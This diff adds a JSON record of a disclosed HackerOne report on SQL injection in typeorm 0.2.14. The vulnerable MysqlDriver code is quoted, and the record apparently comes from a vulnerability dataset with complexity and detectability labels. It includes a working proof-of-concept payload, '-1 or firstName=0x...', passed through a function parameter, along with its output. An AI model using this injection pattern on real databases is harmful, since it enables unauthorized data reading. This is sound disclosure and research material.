@@ -1,0 +1,45 @@
+{
+  "reported_to": "Node.js third-party modules",
+  "reported_by": "verichains ",
+  "title": "[typeorm] SQL Injection",
+  "content": "\nI would like to report SQL Injection in typeorm.\nIt allows reading data from database.\nModule\nmodule name: typeorm\nversion: 0.2.14\nnpm page: https://www.npmjs.com/package/typeorm\nModule Description\nTypeORM is an ORM that can run in NodeJS, Browser, Cordova, PhoneGap, Ionic, React Native, NativeScript, Expo, and Electron platforms and can be used with TypeScript and JavaScript (ES5, ES6, ES7, ES8). Its goal is to always support the latest JavaScript features and provide additional features that help you to develop any kind of application that uses databases - from small applications with a few tables to large scale enterprise applications with multiple databases.\nTypeORM supports both Active Record and Data Mapper patterns, unlike all other JavaScript ORMs currently in existence, which means you can write high quality, loosely coupled, scalable, maintainable applications the most productive way.\nModule Stats\nReplace stats below with numbers from npm\u2019s module page:\n79,749 downloads in the last week\nVulnerability\nVulnerability Description\nMethod escapeQueryWithParameters of MysqlDriver.ts directly return value from parameter if it is a function without escaping which allow attacker to perform SQL Injection in specialized context.\nhttps://github.com/typeorm/typeorm/blob/d9f5581b22c4cccfab55ee23fad699e1c8acadf8/src/driver/mysql/MysqlDriver.ts#L387\nCode 187 Bytes\n1            if (value instanceof Function) {\n2                return value();\n3\n4            } else {\n5                escapedParameters.push(value);\n6                return \"?\";\n7            }\nI'm not sure if this is intended or not, there's no information in the document, if someone used this pattern (value provided by a function callback) it will lead to sql injection attack.\nSteps To Reproduce:\nCreate a new test typeorm package\nCode 45 Bytes\n1npx typeorm init --name Test --database mysql\nEdit ormconfig.json for local credentials.\nModify index.ts to test the injection:\nCode 736 Bytes\n1import \"reflect-metadata\";\n2import {createConnection} from \"typeorm\";\n3import {User} from \"./entity/User\";\n4\n5createConnection().then(async connection => {\n6\n7    console.log(\"Inserting a new user into the database...\");\n8\n9    for(var i=0;i<10;i++) {\n10        const user = new User();\n11        user.firstName = `Timber ${i}`;\n12        user.lastName = \"Saw\";\n13        user.age = 25 + i;\n14        await connection.manager.save(user);\n15        console.log(\"Saved a new user with id: \" + user.id);\n16    }\n17\n18    const repo = connection.getRepository(User);\n19\n20    console.log(await repo.createQueryBuilder().where('firstName = :name', {name: () => \"-1 or firstName=0x54696d6265722033\"}).getOne());\n21\n22    process.exit(0);\n23}).catch(error => console.log(error));\n(0x54696d6265722033 is \"Timber 3\")\nOutput:\nCode 105 Bytes\n1Inserting a new user into the database...\n2User { id: 5, firstName: 'Timber 3', lastName: 'Saw', age: 28 }\nSupporting Material/References:\nState all technical information about the stack where the vulnerability was found\nMacOs\nNodeJS v8.12.0\nnpm 6.4.1\nWrap up\nSelect Y or N for the following statements:\nI contacted the maintainer to let them know: N\nI opened an issue in the related repository: N\nImpact\nAllow attackers to perform SQL Injection attacks.\n\n",
+  "severity": [
+    8.6,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "SQL Injection"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1554193500,
+  "report_url": "https://hackerone.com/reports/506654",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "MEDIUM",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Initialize a new TypeORM project with MySQL database: `npx typeorm init --name Test --database mysql`"
+    ],
+    [
+      2,
+      "Modify the index.ts file to include a query with a function parameter that returns unescaped SQL: `console.log(await repo.createQueryBuilder().where('firstName = :name', {name: () => \"-1 or firstName=0x54696d6265722033\"}).getOne());`"
+    ]
+  ],
+  "vuln_description": "The vulnerability in TypeORM's `escapeQueryWithParameters` method in `MysqlDriver.ts` allows SQL injection when a function is passed as a parameter value. The method directly executes the function and uses its return value in the SQL query without proper escaping, enabling attackers to inject malicious SQL code.",
+  "reason": "The vulnerability requires understanding of TypeORM's query parameter handling and recognizing that function parameters bypass escaping. While the attack vector is straightforward once identified, discovering it requires knowledge of both TypeORM internals and SQL injection techniques.",
+  "new_complexity": "MEDIUM",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": true
+  },
+  "authnz_metadata": {
+    "reason": "The SQL injection vulnerability in TypeORM involves direct execution of function values without proper escaping, which is a code-level issue rather than an authentication or authorization boundary crossing. The proposed methodologies focus on testing authorization boundaries by swapping user sessions and resource IDs, not on identifying insecure code patterns like SQL injection.",
+    "is_detectable": false
+  }
+}
